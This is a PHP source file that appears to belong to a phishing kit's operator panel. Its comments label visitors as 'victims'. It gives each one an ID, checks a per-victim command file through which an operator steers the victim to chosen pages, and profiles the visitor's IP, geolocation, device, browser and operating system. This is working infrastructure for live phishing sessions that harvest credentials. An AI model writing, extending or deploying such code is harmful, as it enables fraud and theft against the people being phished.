<?php
// Start session only if not already active
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// -------------------------------------------------------------------
// 1. Generate or retrieve a unique victim ID (used for command files)
// -------------------------------------------------------------------
if (!isset($_SESSION['unique_id'])) {
    require_once(__DIR__ . '/request_id.php');
    $_SESSION['unique_id'] = generate_request_id();
}

// -------------------------------------------------------------------
// 2. Helper function to check for pending commands and return target page
// -------------------------------------------------------------------
function checkCommand() {
    $uniqueId = $_SESSION['unique_id'] ?? '';
    if ($uniqueId === '') {
        return '';
    }

    $commandDir = __DIR__ . '/../../client-area/commands/';
    $commandFile = $commandDir . $uniqueId . '.txt';

    if (!is_file($commandFile)) {
        return '';
    }

    $command = trim((string) file_get_contents($commandFile));
    @unlink($commandFile);

    require_once __DIR__ . '/../process_request.php';
    $target = getTargetPage($command);

    return $target !== '' ? $target : '';
}

if (!defined('PANEL_DEBUG')) {
    define('PANEL_DEBUG', getenv('PANEL_DEBUG') === '1');
}

/**
 * Optional HTML debug strip for lab testing (enable with PANEL_DEBUG=1).
 */
function panel_debug_box() {
    if (!PANEL_DEBUG || !isset($_SESSION)) {
        return;
    }
    $uid = $_SESSION['unique_id'] ?? '';
    $f = __DIR__ . '/../../client-area/commands/' . $uid . '.txt';
    $exists = $uid !== '' && is_file($f);
    echo '<div style="background:#f0f0f0;padding:6px;font-size:11px;position:fixed;bottom:0;right:0;z-index:99999;border:1px solid #999;max-width:90%;">';
    echo 'PANEL_DEBUG | unique_id: ' . htmlspecialchars($uid, ENT_QUOTES, 'UTF-8');
    echo '<br>command file: ' . ($exists ? 'EXISTS' : 'none');
    echo '</div>';
}

// -------------------------------------------------------------------
// 3. IP detection (same as before, but with full fallback)
// -------------------------------------------------------------------
if (getenv('HTTP_CLIENT_IP')) {
    $_SESSION['ip'] = getenv('HTTP_CLIENT_IP');
} elseif (getenv('HTTP_X_FORWARDED_FOR')) {
    $_SESSION['ip'] = getenv('HTTP_X_FORWARDED_FOR');
} elseif (getenv('HTTP_X_FORWARDED')) {
    $_SESSION['ip'] = getenv('HTTP_X_FORWARDED');
} elseif (getenv('HTTP_FORWARDED_FOR')) {
    $_SESSION['ip'] = getenv('HTTP_FORWARDED_FOR');
} elseif (getenv('HTTP_FORWARDED')) {
    $_SESSION['ip'] = getenv('HTTP_FORWARDED');
} elseif (getenv('REMOTE_ADDR')) {
    $_SESSION['ip'] = getenv('REMOTE_ADDR');
}
if (empty($_SESSION['ip'])) {
    $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1';
}
$_SESSION['hostname'] = gethostname();

// -------------------------------------------------------------------
// 4. Fetch geolocation with complete fallback (to avoid undefined keys)
// -------------------------------------------------------------------
function fetchJsonData($url) {
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_TIMEOUT, 5);
    $response = curl_exec($curl);
    if (curl_errno($curl)) {
        error_log('Curl error: ' . curl_error($curl));
        curl_close($curl);
        return null;
    }
    curl_close($curl);
    $data = json_decode($response, true);
    if ($data === null) {
        error_log('Error decoding JSON from ip-api');
        return null;
    }
    return $data;
}

$ipData = fetchJsonData("http://ip-api.com/json/".$_SESSION['ip']);
if ($ipData === null || !isset($ipData['status']) || $ipData['status'] !== 'success') {
    // Fallback values for all fields used in tests.php, formatting.php, etc.
    $ipData = [
        'status'      => 'fail',
        'query'       => $_SESSION['ip'],
        'country'     => 'Unknown',
        'countryCode' => 'XX',
        'region'      => '',
        'regionName'  => '',
        'city'        => '',
        'zip'         => '',
        'lat'         => 0,
        'lon'         => 0,
        'timezone'    => 'UTC',
        'isp'         => 'Unknown ISP',
        'org'         => 'Unknown Organization',
        'as'          => 'AS0000 Unknown',
    ];
}
$_SESSION['user_data'] = $ipData;
date_default_timezone_set($ipData['timezone']);

// -------------------------------------------------------------------
// 5. Device & browser detection (unchanged)
// -------------------------------------------------------------------
$user_agent = $_SERVER['HTTP_USER_AGENT'];
if (is_numeric(strpos(strtolower($user_agent), "mobile"))) {
    $_SESSION['device'] = 'Mobile';
} elseif (is_numeric(strpos(strtolower($user_agent), "tablet"))) {
    $_SESSION['device'] = 'Tablet';
} else {
    $_SESSION['device'] = 'Desktop';
}

function getUserBrowser() {
    $fullUserBrowser = (!empty($_SERVER['HTTP_USER_AGENT']) 
        ? $_SERVER['HTTP_USER_AGENT'] 
        : getenv('HTTP_USER_AGENT'));
    $userBrowser = explode(')', $fullUserBrowser);
    $userBrowser = $userBrowser[count($userBrowser)-1];

    if ((!$userBrowser || $userBrowser === '' || $userBrowser === ' ' || strpos($userBrowser, 'like Gecko') === 1) && strpos($fullUserBrowser, 'Windows') !== false) {
        return 'Internet-Explorer';
    } elseif ((strpos($userBrowser, 'Edge/') !== false || strpos($userBrowser, 'Edg/') !== false) && strpos($fullUserBrowser, 'Windows') !== false) {
        return 'Microsoft-Edge';
    } elseif (strpos($userBrowser, 'Chrome/') === 1 || strpos($userBrowser, 'CriOS/') === 1) {
        return 'Google-Chrome';
    } elseif (strpos($userBrowser, 'Firefox/') !== false || strpos($userBrowser, 'FxiOS/') !== false) {
        return 'Mozilla-Firefox';
    } elseif (strpos($userBrowser, 'Safari/') !== false && strpos($fullUserBrowser, 'Mac') !== false) {
        return 'Safari';
    } elseif (strpos($userBrowser, 'OPR/') !== false && strpos($fullUserBrowser, 'Opera Mini') !== false) {
        return 'Opera-Mini';
    } elseif (strpos($userBrowser, 'OPR/') !== false) {
        return 'Opera';
    }
    return false;
}
$_SESSION['browser'] = getUserBrowser();

function getOS() {
    global $user_agent;
    $os_platform = "Unknown OS Platform";
    $os_array = array(
        '/windows nt 10/i'      => 'Windows 10',
        '/windows nt 6.3/i'     => 'Windows 8.1',
        '/windows nt 6.2/i'     => 'Windows 8',
        '/windows nt 6.1/i'     => 'Windows 7',
        '/windows nt 6.0/i'     => 'Windows Vista',
        '/windows nt 5.2/i'     => 'Windows Server 2003/XP x64',
        '/windows nt 5.1/i'     => 'Windows XP',
        '/windows xp/i'         => 'Windows XP',
        '/windows nt 5.0/i'     => 'Windows 2000',
        '/windows me/i'         => 'Windows ME',
        '/win98/i'              => 'Windows 98',
        '/win95/i'              => 'Windows 95',
        '/win16/i'              => 'Windows 3.11',
        '/macintosh|mac os x/i' => 'macOS',
        '/mac_powerpc/i'        => 'macOS',
        '/linux/i'              => 'Linux',
        '/ubuntu/i'             => 'Ubuntu',
        '/iphone/i'             => 'iOS',
        '/ipod/i'               => 'iOS',
        '/ipad/i'               => 'iOS',
        '/android/i'            => 'Android',
        '/blackberry/i'         => 'BlackBerry',
        '/webos/i'              => 'Mobile'
    );
    foreach ($os_array as $regex => $value) {
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value;
            break;
        }
    }
    return $os_platform;
}
$_SESSION['os'] = getOS();

function isAppleDevice() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $isAppleMobile = (strpos($userAgent, 'iPhone') !== false || strpos($userAgent, 'iPad') !== false || strpos($userAgent, 'iPod') !== false);
    $isAppleComputer = (strpos($userAgent, 'Macintosh') !== false || strpos($userAgent, 'Mac OS X') !== false);
    return $isAppleMobile || $isAppleComputer;
}
?>